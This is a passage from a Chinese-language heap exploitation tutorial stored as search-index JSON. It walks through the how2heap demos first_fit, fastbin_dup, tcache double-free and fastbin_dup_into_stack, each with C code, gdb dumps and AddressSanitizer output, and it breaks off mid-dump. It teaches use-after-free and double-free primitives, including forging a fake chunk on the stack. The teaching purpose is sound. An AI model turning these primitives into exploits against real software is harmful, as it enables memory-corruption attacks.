\u8bf7\u6ce8\u610f\uff0c\u4e0b\u6587\u4e2d\u8d34\u51fa\u7684\u4ee3\u7801\u662f\u6211\u7b80\u5316\u8fc7\u7684\uff0c\u5254\u9664\u548c\u4fee\u6539\u4e86\u4e00\u4e9b\u4e0d\u5fc5\u8981\u7684\u6ce8\u91ca\u548c\u4ee3\u7801\uff0c\u4ee5\u65b9\u4fbf\u5b66\u4e60\u3002\u53e6\u5916\uff0c\u6b63\u5982\u7ae0\u8282 4.3 \u4e2d\u6240\u8bb2\u7684\uff0c\u6dfb\u52a0\u7f16\u8bd1\u53c2\u6570 CFLAGS += -fsanitize=address \u53ef\u4ee5\u68c0\u6d4b\u5185\u5b58\u9519\u8bef\u3002 \u4e0b\u8f7d\u6587\u4ef6","title":"how2heap"},{"location":"Tutorial/Material/Binary%20Exploitation/#first_fit","text":"#include <stdio.h> #include <stdlib.h> #include <string.h> int main() { char* a = malloc(512); char* b = malloc(256); char* c; fprintf(stderr, \"1st malloc(512): %p\\n\", a); fprintf(stderr, \"2nd malloc(256): %p\\n\", b); strcpy(a, \"AAAAAAAA\"); strcpy(b, \"BBBBBBBB\"); fprintf(stderr, \"first allocation %p points to %s\\n\", a, a); fprintf(stderr, \"Freeing the first one...\\n\"); free(a); c = malloc(500); fprintf(stderr, \"3rd malloc(500): %p\\n\", c); strcpy(c, \"CCCCCCCC\"); fprintf(stderr, \"3rd allocation %p points to %s\\n\", c, c); fprintf(stderr, \"first allocation %p points to %s\\n\", a, a); } $ gcc -g first_fit.c $ ./a.out 1st malloc(512): 0x1380010 2nd malloc(256): 0x1380220 first allocation 0x1380010 points to AAAAAAAA Freeing the first one... 3rd malloc(500): 0x1380010 3rd allocation 0x1380010 points to CCCCCCCC first allocation 0x1380010 points to CCCCCCCC \u8fd9\u7b2c\u4e00\u4e2a\u7a0b\u5e8f\u5c55\u793a\u4e86 glibc \u5806\u5206\u914d\u7684\u7b56\u7565\uff0c\u5373 first-fit\u3002\u5728\u5206\u914d\u5185\u5b58\u65f6\uff0cmalloc \u4f1a\u5148\u5230 unsorted bin\uff08\u6216\u8005fastbins\uff09 \u4e2d\u67e5\u627e\u9002\u5408\u7684\u88ab free \u7684 chunk\uff0c\u5982\u679c\u6ca1\u6709\uff0c\u5c31\u4f1a\u628a unsorted bin \u4e2d\u7684\u6240\u6709 chunk \u5206\u522b\u653e\u5165\u5230\u6240\u5c5e\u7684 bins \u4e2d\uff0c\u7136\u540e\u518d\u53bb\u8fd9\u4e9b bins \u91cc\u53bb\u627e\u5408\u9002\u7684 chunk\u3002\u53ef\u4ee5\u770b\u5230\u7b2c\u4e09\u6b21 malloc \u7684\u5730\u5740\u548c\u7b2c\u4e00\u6b21\u76f8\u540c\uff0c\u5373 malloc \u627e\u5230\u4e86\u7b2c\u4e00\u6b21 free \u6389\u7684 chunk\uff0c\u5e76\u628a\u5b83\u91cd\u65b0\u5206\u914d\u3002 \u5728 gdb \u4e2d\u8c03\u8bd5\uff0c\u4e24\u4e2a malloc \u4e4b\u540e\uff08chunk \u4f4d\u4e8e malloc \u8fd4\u56de\u5730\u5740\u51cf\u53bb 0x10 \u7684\u4f4d\u7f6e\uff09\uff1a gef\u27a4 x/5gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000211 <-- chunk a 0x602010: 0x4141414141414141 0x0000000000000000 0x602020: 0x0000000000000000 gef\u27a4 x/5gx 0x602220-0x10 0x602210: 0x0000000000000000 0x0000000000000111 <-- chunk b 0x602220: 0x4242424242424242 0x0000000000000000 0x602230: 0x0000000000000000 \u7b2c\u4e00\u4e2a free \u4e4b\u540e\uff0c\u5c06\u5176\u52a0\u5165\u5230 unsorted bin \u4e2d\uff1a gef\u27a4 x/5gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000211 <-- chunk a [be freed] 0x602010: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 <-- fd pointer, bk pointer 0x602020: 0x0000000000000000 gef\u27a4 x/5gx 0x602220-0x10 0x602210: 0x0000000000000210 0x0000000000000110 <-- chunk b 0x602220: 0x4242424242424242 0x0000000000000000 0x602230: 0x0000000000000000 gef\u27a4 heap bins unsorted [ Unsorted Bin for arena 'main_arena' ] [+] unsorted_bins[0]: fw=0x602000, bk=0x602000 \u2192 Chunk(addr=0x602010, size=0x210, flags=PREV_INUSE) [+] Found 1 chunks in unsorted bin. \u7b2c\u4e09\u4e2a malloc \u4e4b\u540e\uff1a gef\u27a4 x/5gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000211 <-- chunk c 0x602010: 0x4343434343434343 0x00007ffff7dd1d00 0x602020: 0x0000000000000000 gef\u27a4 x/5gx 0x602220-0x10 0x602210: 0x0000000000000210 0x0000000000000111 <-- chunk b 0x602220: 0x4242424242424242 0x0000000000000000 0x602230: 0x0000000000000000 \u6240\u4ee5\u5f53\u91ca\u653e\u4e00\u5757\u5185\u5b58\u540e\u518d\u7533\u8bf7\u4e00\u5757\u5927\u5c0f\u7565\u5c0f\u4e8e\u7684\u7a7a\u95f4\uff0c\u90a3\u4e48 glibc \u503e\u5411\u4e8e\u5c06\u5148\u524d\u88ab\u91ca\u653e\u7684\u7a7a\u95f4\u91cd\u65b0\u5206\u914d\u3002 \u597d\u4e86\uff0c\u73b0\u5728\u6211\u4eec\u52a0\u4e0a\u5185\u5b58\u68c0\u6d4b\u53c2\u6570\u91cd\u65b0\u7f16\u8bd1\uff1a $ gcc -fsanitize=address -g first_fit.c $ ./a.out 1st malloc(512): 0x61500000fd00 2nd malloc(256): 0x611000009f00 first allocation 0x61500000fd00 points to AAAAAAAA Freeing the first one... 3rd malloc(500): 0x61500000fa80 3rd allocation 0x61500000fa80 points to CCCCCCCC ================================================================= ==4525==ERROR: AddressSanitizer: heap-use-after-free on address 0x61500000fd00 at pc 0x7f49d14a61e9 bp 0x7ffe40b526e0 sp 0x7ffe40b51e58 READ of size 2 at 0x61500000fd00 thread T0 #0 0x7f49d14a61e8 (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x601e8) #1 0x7f49d14a6bcc in vfprintf (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x60bcc) #2 0x7f49d14a6cf9 in fprintf (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x60cf9) #3 0x400b8b in main /home/firmy/how2heap/first_fit.c:23 #4 0x7f49d109c82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) #5 0x400878 in _start (/home/firmy/how2heap/a.out+0x400878) 0x61500000fd00 is located 0 bytes inside of 512-byte region [0x61500000fd00,0x61500000ff00) freed by thread T0 here: #0 0x7f49d14de2ca in __interceptor_free (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x982ca) #1 0x400aa2 in main /home/firmy/how2heap/first_fit.c:17 #2 0x7f49d109c82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) previously allocated by thread T0 here: #0 0x7f49d14de602 in malloc (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x98602) #1 0x400957 in main /home/firmy/how2heap/first_fit.c:6 #2 0x7f49d109c82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) \u4e00\u4e2a\u5f88\u660e\u663e\u7684 use-after-free \u6f0f\u6d1e\u3002\u5173\u4e8e\u8fd9\u7c7b\u6f0f\u6d1e\u7684\u8be6\u7ec6\u5229\u7528\u8fc7\u7a0b\uff0c\u6211\u4eec\u4f1a\u5728\u540e\u9762\u7684\u7ae0\u8282\u91cc\u518d\u8bb2\u3002","title":"first_fit"},{"location":"Tutorial/Material/Binary%20Exploitation/#fastbin_dup","text":"#include <stdio.h> #include <stdlib.h> #include <string.h> int main() { fprintf(stderr, \"Allocating 3 buffers.\\n\"); char *a = malloc(9); char *b = malloc(9); char *c = malloc(9); strcpy(a, \"AAAAAAAA\"); strcpy(b, \"BBBBBBBB\"); strcpy(c, \"CCCCCCCC\"); fprintf(stderr, \"1st malloc(9) %p points to %s\\n\", a, a); fprintf(stderr, \"2nd malloc(9) %p points to %s\\n\", b, b); fprintf(stderr, \"3rd malloc(9) %p points to %s\\n\", c, c); fprintf(stderr, \"Freeing the first one %p.\\n\", a); free(a); fprintf(stderr, \"Then freeing another one %p.\\n\", b); free(b); fprintf(stderr, \"Freeing the first one %p again.\\n\", a); free(a); fprintf(stderr, \"Allocating 3 buffers.\\n\"); char *d = malloc(9); char *e = malloc(9); char *f = malloc(9); strcpy(d, \"DDDDDDDD\"); fprintf(stderr, \"4st malloc(9) %p points to %s the first time\\n\", d, d); strcpy(e, \"EEEEEEEE\"); fprintf(stderr, \"5nd malloc(9) %p points to %s\\n\", e, e); strcpy(f, \"FFFFFFFF\"); fprintf(stderr, \"6rd malloc(9) %p points to %s the second time\\n\", f, f); } $ gcc -g fastbin_dup.c $ ./a.out Allocating 3 buffers. 1st malloc(9) 0x1c07010 points to AAAAAAAA 2nd malloc(9) 0x1c07030 points to BBBBBBBB 3rd malloc(9) 0x1c07050 points to CCCCCCCC Freeing the first one 0x1c07010. Then freeing another one 0x1c07030. Freeing the first one 0x1c07010 again. Allocating 3 buffers. 4st malloc(9) 0x1c07010 points to DDDDDDDD the first time 5nd malloc(9) 0x1c07030 points to EEEEEEEE 6rd malloc(9) 0x1c07010 points to FFFFFFFF the second time \u8fd9\u4e2a\u7a0b\u5e8f\u5c55\u793a\u4e86\u5229\u7528 fastbins \u7684 double-free \u653b\u51fb\uff0c\u53ef\u4ee5\u6cc4\u6f0f\u51fa\u4e00\u5757\u5df2\u7ecf\u88ab\u5206\u914d\u7684\u5185\u5b58\u6307\u9488\u3002fastbins \u53ef\u4ee5\u770b\u6210\u4e00\u4e2a LIFO \u7684\u6808\uff0c\u4f7f\u7528\u5355\u94fe\u8868\u5b9e\u73b0\uff0c\u901a\u8fc7 fastbin->fd \u6765\u904d\u5386 fastbins\u3002\u7531\u4e8e free \u7684\u8fc7\u7a0b\u4f1a\u5bf9 free list \u505a\u68c0\u67e5\uff0c\u6211\u4eec\u4e0d\u80fd\u8fde\u7eed\u4e24\u6b21 free \u540c\u4e00\u4e2a chunk\uff0c\u6240\u4ee5\u8fd9\u91cc\u5728\u4e24\u6b21 free \u4e4b\u95f4\uff0c\u589e\u52a0\u4e86\u4e00\u6b21\u5bf9\u5176\u4ed6 chunk \u7684 free \u8fc7\u7a0b\uff0c\u4ece\u800c\u7ed5\u8fc7\u68c0\u67e5\u987a\u5229\u6267\u884c\u3002\u7136\u540e\u518d malloc \u4e09\u6b21\uff0c\u5c31\u5728\u540c\u4e00\u4e2a\u5730\u5740 malloc \u4e86\u4e24\u6b21\uff0c\u4e5f\u5c31\u6709\u4e86\u4e24\u4e2a\u6307\u5411\u540c\u4e00\u5757\u5185\u5b58\u533a\u57df\u7684\u6307\u9488\u3002 libc-2.23 \u4e2d\u5bf9 double-free \u7684\u68c0\u67e5\u8fc7\u7a0b\u5982\u4e0b\uff1a /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ if (__builtin_expect (old == p, 0)) { errstr = \"double free or corruption (fasttop)\"; goto errout; } \u5b83\u5728\u68c0\u67e5 fast bin \u7684 double-free \u65f6\u53ea\u662f\u68c0\u67e5\u4e86\u7b2c\u4e00\u4e2a\u5757\u3002\u6240\u4ee5\u5176\u5b9e\u662f\u5b58\u5728\u7f3a\u9677\u7684\u3002 \u4e09\u4e2a malloc \u4e4b\u540e\uff1a gef\u27a4 x/15gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk a 0x602010: 0x4141414141414141 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000021 <-- chunk b 0x602030: 0x4242424242424242 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000021 <-- chunk c 0x602050: 0x4343434343434343 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000020fa1 <-- top chunk 0x602070: 0x0000000000000000 \u7b2c\u4e00\u4e2a free \u4e4b\u540e\uff0cchunk a \u88ab\u6dfb\u52a0\u5230 fastbins \u4e2d\uff1a gef\u27a4 x/15gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk a [be freed] 0x602010: 0x0000000000000000 0x0000000000000000 <-- fd pointer 0x602020: 0x0000000000000000 0x0000000000000021 <-- chunk b 0x602030: 0x4242424242424242 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000021 <-- chunk c 0x602050: 0x4343434343434343 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000020fa1 0x602070: 0x0000000000000000 gef\u27a4 heap bins fast [ Fastbins for arena 0x7ffff7dd1b20 ] Fastbins[idx=0, size=0x10] \u2190 Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE) \u7b2c\u4e8c\u4e2a free \u4e4b\u540e\uff0cchunk b \u88ab\u6dfb\u52a0\u5230 fastbins \u4e2d\uff1a gef\u27a4 x/15gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk a [be freed] 0x602010: 0x0000000000000000 0x0000000000000000 <-- fd pointer 0x602020: 0x0000000000000000 0x0000000000000021 <-- chunk b [be freed] 0x602030: 0x0000000000602000 0x0000000000000000 <-- fd pointer 0x602040: 0x0000000000000000 0x0000000000000021 <-- chunk c 0x602050: 0x4343434343434343 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000020fa1 0x602070: 0x0000000000000000 gef\u27a4 heap bins fast [ Fastbins for arena 0x7ffff7dd1b20 ] Fastbins[idx=0, size=0x10] \u2190 Chunk(addr=0x602030, size=0x20, flags=PREV_INUSE) \u2190 Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE) \u6b64\u65f6\u7531\u4e8e chunk a \u5904\u4e8e bin \u4e2d\u7b2c 2 \u5757\u7684\u4f4d\u7f6e\uff0c\u4e0d\u4f1a\u88ab double-free \u7684\u68c0\u67e5\u673a\u5236\u68c0\u67e5\u51fa\u6765\u3002\u6240\u4ee5\u7b2c\u4e09\u4e2a free \u4e4b\u540e\uff0cchunk a \u518d\u6b21\u88ab\u6dfb\u52a0\u5230 fastbins \u4e2d\uff1a gef\u27a4 x/15gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk a [be freed again] 0x602010: 0x0000000000602020 0x0000000000000000 <-- fd pointer 0x602020: 0x0000000000000000 0x0000000000000021 <-- chunk b [be freed] 0x602030: 0x0000000000602000 0x0000000000000000 <-- fd pointer 0x602040: 0x0000000000000000 0x0000000000000021 <-- chunk c 0x602050: 0x4343434343434343 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000020fa1 0x602070: 0x0000000000000000 gef\u27a4 heap bins fast [ Fastbins for arena 0x7ffff7dd1b20 ] Fastbins[idx=0, size=0x10] \u2190 Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE) \u2190 Chunk(addr=0x602030, size=0x20, flags=PREV_INUSE) \u2190 Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE) \u2192 [loop detected] \u6b64\u65f6 chunk a \u548c chunk b \u4f3c\u4e4e\u5f62\u6210\u4e86\u4e00\u4e2a\u73af\u3002 \u518d\u4e09\u4e2a malloc \u4e4b\u540e\uff1a gef\u27a4 x/15gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk d, chunk f 0x602010: 0x4646464646464646 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000021 <-- chunk e 0x602030: 0x4545454545454545 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000021 <-- chunk c 0x602050: 0x4343434343434343 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000020fa1 0x602070: 0x0000000000000000 \u6240\u4ee5\u5bf9\u4e8e fastbins\uff0c\u53ef\u4ee5\u901a\u8fc7 double-free \u6cc4\u6f0f\u51fa\u4e00\u4e2a\u5806\u5757\u7684\u6307\u9488\u3002 \u52a0\u4e0a\u5185\u5b58\u68c0\u6d4b\u53c2\u6570\u91cd\u65b0\u7f16\u8bd1\uff1a $ gcc -fsanitize=address -g fastbin_dup.c $ ./a.out Allocating 3 buffers. 1st malloc(9) 0x60200000eff0 points to AAAAAAAA 2nd malloc(9) 0x60200000efd0 points to BBBBBBBB 3rd malloc(9) 0x60200000efb0 points to CCCCCCCC Freeing the first one 0x60200000eff0. Then freeing another one 0x60200000efd0. Freeing the first one 0x60200000eff0 again. ================================================================= ==5650==ERROR: AddressSanitizer: attempting double-free on 0x60200000eff0 in thread T0: #0 0x7fdc18ebf2ca in __interceptor_free (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x982ca) #1 0x400ba3 in main /home/firmy/how2heap/fastbin_dup.c:22 #2 0x7fdc18a7d82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) #3 0x400878 in _start (/home/firmy/how2heap/a.out+0x400878) 0x60200000eff0 is located 0 bytes inside of 9-byte region [0x60200000eff0,0x60200000eff9) freed by thread T0 here: #0 0x7fdc18ebf2ca in __interceptor_free (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x982ca) #1 0x400b0d in main /home/firmy/how2heap/fastbin_dup.c:18 #2 0x7fdc18a7d82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) previously allocated by thread T0 here: #0 0x7fdc18ebf602 in malloc (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x98602) #1 0x400997 in main /home/firmy/how2heap/fastbin_dup.c:7 #2 0x7fdc18a7d82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) \u4e00\u4e2a\u5f88\u660e\u663e\u7684 double-free \u6f0f\u6d1e\u3002\u5173\u4e8e\u8fd9\u7c7b\u6f0f\u6d1e\u7684\u8be6\u7ec6\u5229\u7528\u8fc7\u7a0b\uff0c\u6211\u4eec\u4f1a\u5728\u540e\u9762\u7684\u7ae0\u8282\u91cc\u518d\u8bb2\u3002 \u770b\u4e00\u70b9\u65b0\u9c9c\u7684\uff0c\u5728 libc-2.26 \u4e2d\uff0c\u5373\u4f7f\u4e24\u6b21 free\uff0c\u4e5f\u5e76\u6ca1\u6709\u89e6\u53d1 double-free \u7684\u5f02\u5e38\u68c0\u6d4b\uff0c\u8fd9\u4e0e tcache \u673a\u5236\u6709\u5173\uff0c\u4ee5\u540e\u4f1a\u8be6\u7ec6\u8bb2\u8ff0\u3002\u8fd9\u91cc\u5148\u770b\u4e2a\u80fd\u591f\u5728\u8be5\u7248\u672c\u4e0b\u89e6\u53d1 double-free \u7684\u4f8b\u5b50\uff1a #include <stdio.h> #include <stdlib.h> int main() { int i; void *p = malloc(0x40); fprintf(stderr, \"First allocate a fastbin: p=%p\\n\", p); fprintf(stderr, \"Then free(p) 7 times\\n\"); for (i = 0; i < 7; i++) { fprintf(stderr, \"free %d: %p => %p\\n\", i+1, &p, p); free(p); } fprintf(stderr, \"Then malloc 8 times at the same address\\n\"); int *a[10]; for (i = 0; i < 8; i++) { a[i] = malloc(0x40); fprintf(stderr, \"malloc %d: %p => %p\\n\", i+1, &a[i], a[i]); } fprintf(stderr, \"Finally trigger double-free\\n\"); for (i = 0; i < 2; i++) { fprintf(stderr, \"free %d: %p => %p\\n\", i+1, &a[i], a[i]); free(a[i]); } } $ gcc -g tcache_double-free.c $ ./a.out First allocate a fastbin: p=0x559e30950260 Then free(p) 7 times free 1: 0x7ffc498b2958 => 0x559e30950260 free 2: 0x7ffc498b2958 => 0x559e30950260 free 3: 0x7ffc498b2958 => 0x559e30950260 free 4: 0x7ffc498b2958 => 0x559e30950260 free 5: 0x7ffc498b2958 => 0x559e30950260 free 6: 0x7ffc498b2958 => 0x559e30950260 free 7: 0x7ffc498b2958 => 0x559e30950260 Then malloc 8 times at the same address malloc 1: 0x7ffc498b2960 => 0x559e30950260 malloc 2: 0x7ffc498b2968 => 0x559e30950260 malloc 3: 0x7ffc498b2970 => 0x559e30950260 malloc 4: 0x7ffc498b2978 => 0x559e30950260 malloc 5: 0x7ffc498b2980 => 0x559e30950260 malloc 6: 0x7ffc498b2988 => 0x559e30950260 malloc 7: 0x7ffc498b2990 => 0x559e30950260 malloc 8: 0x7ffc498b2998 => 0x559e30950260 Finally trigger double-free free 1: 0x7ffc498b2960 => 0x559e30950260 free 2: 0x7ffc498b2968 => 0x559e30950260 double free or corruption (fasttop) [2] 1244 abort (core dumped) ./a.out","title":"fastbin_dup"},{"location":"Tutorial/Material/Binary%20Exploitation/#fastbin_dup_into_stack","text":"#include <stdio.h> #include <stdlib.h> #include <string.h> int main() { unsigned long long stack_var = 0x21; fprintf(stderr, \"Allocating 3 buffers.\\n\"); char *a = malloc(9); char *b = malloc(9); char *c = malloc(9); strcpy(a, \"AAAAAAAA\"); strcpy(b, \"BBBBBBBB\"); strcpy(c, \"CCCCCCCC\"); fprintf(stderr, \"1st malloc(9) %p points to %s\\n\", a, a); fprintf(stderr, \"2nd malloc(9) %p points to %s\\n\", b, b); fprintf(stderr, \"3rd malloc(9) %p points to %s\\n\", c, c); fprintf(stderr, \"Freeing the first one %p.\\n\", a); free(a); fprintf(stderr, \"Then freeing another one %p.\\n\", b); free(b); fprintf(stderr, \"Freeing the first one %p again.\\n\", a); free(a); fprintf(stderr, \"Allocating 4 buffers.\\n\"); unsigned long long *d = malloc(9); *d = (unsigned long long) (((char*)&stack_var) - sizeof(d)); fprintf(stderr, \"4nd malloc(9) %p points to %p\\n\", d, &d); char *e = malloc(9); strcpy(e, \"EEEEEEEE\"); fprintf(stderr, \"5nd malloc(9) %p points to %s\\n\", e, e); char *f = malloc(9); strcpy(f, \"FFFFFFFF\"); fprintf(stderr, \"6rd malloc(9) %p points to %s\\n\", f, f); char *g = malloc(9); strcpy(g, \"GGGGGGGG\"); fprintf(stderr, \"7th malloc(9) %p points to %s\\n\", g, g); } $ gcc -g fastbin_dup_into_stack.c $ ./a.out Allocating 3 buffers. 1st malloc(9) 0xcf2010 points to AAAAAAAA 2nd malloc(9) 0xcf2030 points to BBBBBBBB 3rd malloc(9) 0xcf2050 points to CCCCCCCC Freeing the first one 0xcf2010. Then freeing another one 0xcf2030. Freeing the first one 0xcf2010 again. Allocating 4 buffers. 4nd malloc(9) 0xcf2010 points to 0x7ffd1e0d48b0 5nd malloc(9) 0xcf2030 points to EEEEEEEE 6rd malloc(9) 0xcf2010 points to FFFFFFFF 7th malloc(9) 0x7ffd1e0d48b0 points to GGGGGGGG \u8fd9\u4e2a\u7a0b\u5e8f\u5c55\u793a\u4e86\u600e\u6837\u901a\u8fc7\u4fee\u6539 fd \u6307\u9488\uff0c\u5c06\u5176\u6307\u5411\u4e00\u4e2a\u4f2a\u9020\u7684 free chunk\uff0c\u5728\u4f2a\u9020\u7684\u5730\u5740\u5904 malloc \u51fa\u4e00\u4e2a chunk\u3002\u8be5\u7a0b\u5e8f\u5927\u90e8\u5206\u5185\u5bb9\u90fd\u548c\u4e0a\u4e00\u4e2a\u7a0b\u5e8f\u4e00\u6837\uff0c\u6f0f\u6d1e\u4e5f\u540c\u6837\u662f double-free\uff0c\u53ea\u6709\u7ed9 fd \u586b\u5145\u7684\u5185\u5bb9\u4e0d\u4e00\u6837\u3002 \u4e09\u4e2a malloc \u4e4b\u540e\uff1a gef\u27a4 x/15gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk a 0x602010: 0x4141414141414141 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000021 <-- chunk b 0x602030: 0x4242424242424242 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000021 <-- chunk c 0x602050: 0x4343434343434343 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000020fa1 <-- top chunk 0x602070: 0x0000000000000000 \u4e09\u4e2a free \u4e4b\u540e\uff1a gef\u27a4 x/15gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk a [be freed twice] 0x602010: 0x0000000000602020 0x0000000000000000 <-- fd pointer 0x602020: 0x0000000000000000 0x0000000000000021 <-- chunk b [be freed] 0x602030: 0x0000000000602000 0x0000000000000000 <-- fd pointer 0x602040: 0x0000000000000000 0x0000000000000021 <-- chunk c 0x602050: 0x4343434343434343 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000020fa1 0x602070: 0x0000000000000000 gef\u27a4 heap bins fast [ Fastbins for arena 0x7ffff7dd1b20 ] Fastbins[idx=0, size=0x10] \u2190 Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE) \u2190 Chunk(addr=0x602030, size=0x20, flags=PREV_INUSE) \u2190 Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE) \u2192 [loop detected] \u8fd9\u4e00\u6b21 malloc \u4e4b\u540e\uff0c\u6211\u4eec\u4e0d\u518d\u586b\u5145\u65e0\u610f\u4e49\u7684 \"DDDDDDDD\"\uff0c\u800c\u662f\u586b\u5145\u4e00\u4e2a\u5730\u5740\uff0c\u5373\u6808\u5730\u5740\u51cf\u53bb 0x8\uff0c\u4ece\u800c\u5728\u6808\u4e0a\u4f2a\u9020\u51fa\u4e00\u4e2a free \u7684 chunk\uff08\u5f53\u7136\u4e5f\u53ef\u4ee5\u662f\u5176\u4ed6\u7684\u5730\u5740\uff09\u3002\u8fd9\u4e5f\u662f\u4e3a\u4ec0\u4e48 stack_var \u88ab\u6211\u4eec\u8bbe\u7f6e\u4e3a 0x21 \uff08\u6216 0x20 \u90fd\u53ef\u4ee5\uff09\uff0c\u5176\u5b9e\u662f\u4e3a\u4e86\u5728\u6808\u5730\u5740\u51cf\u53bb 0x8 \u7684\u65f6\u5019\u4f5c\u4e3a fake chunk \u7684 size \u5b57\u6bb5\u3002 glibc \u5728\u6267\u884c\u5206\u914d\u64cd\u4f5c\u65f6\uff0c\u82e5\u5757\u7684\u5927\u5c0f\u7b26\u5408 fast bin\uff0c\u5219\u4f1a\u5728\u5bf9\u5e94\u7684 bin \u4e2d\u5bfb\u627e\u5408\u9002\u7684\u5757\uff0c\u6b64\u65f6 glibc \u5c06\u6839\u636e\u5019\u9009\u5757\u7684 size \u5b57\u6bb5\u8ba1\u7b97\u51fa fastbin \u7d22\u5f15\uff0c\u7136\u540e\u4e0e\u5bf9\u5e94 bin \u5728 fastbin \u4e2d\u7684\u7d22\u5f15\u8fdb\u884c\u6bd4\u8f83\uff0c\u5982\u679c\u4e8c\u8005\u4e0d\u5339\u914d\uff0c\u5219\u8bf4\u660e\u5757\u7684 size \u5b57\u6bb5\u906d\u5230\u7834\u574f\u3002\u6240\u4ee5\u9700\u8981 fake chunk \u7684 size \u5b57\u6bb5\u88ab\u8bbe\u7f6e\u4e3a\u6b63\u786e\u7684\u503c\u3002 /* offset 2 to use otherwise unindexable first 2 bins */ #define fastbin_index(sz) \\ ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2) if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ())) { idx = fastbin_index (nb); [...] if (victim != 0) { if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0)) { errstr = \"malloc(): memory corruption (fast)\"; [...] } [...] } } \u7b80\u5355\u5730\u8bf4\u5c31\u662f fake chunk \u7684 size \u4e0e double-free \u7684 chunk \u7684 size \u76f8\u540c\u5373\u53ef\u3002 gef\u27a4 x/15gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk d 0x602010: 0x00007fffffffdc30 0x0000000000000000 <-- fd pointer 0x602020: 0x0000000000000000 0x0000000000000021 <-- chunk b [be freed] 0x602030: 0x0000000000602000 0x0000000000000000 <-- fd pointer 0x602040: 0x0000000000000000 0x0000000000000021 <-- chunk c 0x602050: 0x4343434343434343 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000020fa1 0x602070: 0x0000000000000000 gef\u27a4 p &stack_var $4 = (unsigned long long *) 0x7fffffffdc38 gef\u27a4 x/5gx 0x7fffffffdc38-0x8 0x7fffffffdc30: 0x0000000000000000 0x0000000000000021 <-- fake chunk [seems to be freed] 0x7fffffffdc40: 0x0000000000602010 0x0000000000602010 <-- fd pointer 0x7fffffffdc50: 0x0000000000602030 gef\u27a4 heap bins fast [ Fastbins for arena 0x7ffff7dd1b20 ] Fastbins[idx=0, size=0x10] \u2190 Chunk(addr=0x602030, size=0x20, flags=PREV_INUSE) \u2190 Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE) \u2190 Chunk(addr=0x7fffffffdc40, size=0x20, flags=PREV_INUSE) \u2190 Chunk(addr=0x602020, size=0x0, flags=) [incorrect fastbin_index] \u53ef\u4ee5\u770b\u5230\uff0c\u4f2a\u9020\u7684 chunk \u5df2\u7ecf\u7531\u6307\u9488\u94fe\u63a5\u5230 fastbins \u4e0a\u4e86\u3002\u4e4b\u540e malloc \u4e24\u6b21\uff0c\u5373\u53ef\u5c06\u4f2a\u9020\u7684 chunk \u79fb\u52a8\u5230\u94fe\u8868\u5934\u90e8\uff1a gef\u27a4 x/15gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 0x602010: 0x4646464646464646 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000021 0x602030: 0x4545454545454545 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000021 0x602050: 0x4343434343434343 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000020fa1 0x602070: 0x0000000000000000 gef\u27a4 heap bins fast [ Fastbins for arena 0x7ffff7dd1b20 ] Fastbins[idx=0, size=0x10] \u2190 Chunk(addr=0x7fffffffdc40, size=0x20, flags=PREV_INUSE) \u2190 Chunk(addr=0x602020, size=0x0, flags=) [incorrect fastbin_index] \u518d\u6b21 malloc\uff0c\u5373\u53ef\u5728 fake chunk \u5904\u5206\u914d\u5185\u5b58\uff1a gef\u27a4 x/5gx 0x7fffffffdc38-0x8 0x7fffffffdc30: 